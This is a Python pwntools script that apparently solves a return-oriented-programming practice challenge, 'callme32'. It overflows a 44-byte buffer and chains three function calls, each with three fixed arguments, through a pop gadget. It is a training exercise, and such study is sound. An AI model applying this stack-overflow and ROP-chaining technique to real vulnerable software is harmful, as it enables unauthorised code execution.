import pwn
import sys

elf = pwn.ELF('./callme32')
io = elf.process()
print(io.recv().decode("utf-8"))

offset = b'A' * 44
popArg = pwn.p32(int("080487f9",16))
arg1 = pwn.p32(int("deadbeef",16))
arg2 = pwn.p32(int("cafebabe",16))
arg3 = pwn.p32(int("d00df00d",16))
call1Add = pwn.p32(int("080484f0",16))
call2Add = pwn.p32(int("08048550",16))
call3Add = pwn.p32(int("080484e0",16))
payload = b"".join(
    [
        offset,
        call1Add,
        popArg,
        arg1,
        arg2,
        arg3,
        call2Add,
        popArg,
        arg1,
        arg2,
        arg3,
        call3Add,
        popArg,
        arg1,
        arg2,
        arg3
    ]
)
print(payload)
io.sendline(payload)
print(io.recv(1000000).decode("utf-8"))
print(io.recv(1000000).decode("utf-8"))